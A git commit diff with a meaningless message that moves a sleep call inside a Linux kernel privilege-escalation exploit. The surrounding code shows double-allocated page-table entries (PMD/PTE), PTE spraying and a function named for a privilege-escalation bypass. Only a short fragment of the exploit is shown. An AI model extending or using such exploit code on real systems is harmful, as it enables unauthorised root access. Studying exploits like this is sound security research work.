a0b91db419a33e2831e70b2f7d8f5abdcf9b354c
Willenst <willenst@gmail.com>
2024-11-22 00:48:13 +0200

    124214214

--- src/main.c
+++ src/main.c
@@ -359,12 +359,13 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 		if (*test_target_addr != 0x41)
 		{
 			printf("[+] confirmed double alloc PMD/PTE\n");
+			sleep(3);
 			PRINTF_VERBOSE("    - PTE area index: %lld\n", i);
 			PRINTF_VERBOSE("    - PTE area (write target address/page): %016llx (new)\n", *test_target_addr);
 			pte_area = test_target_addr;
 		}
 	}
-	sleep(3);
+
 	if (pte_area == NULL)
 	{
 		printf("[-] failed to detect overwritten pte: is more PTE spray needed? pmd: %016llx\n", *(unsigned long long*)_pmd_area);
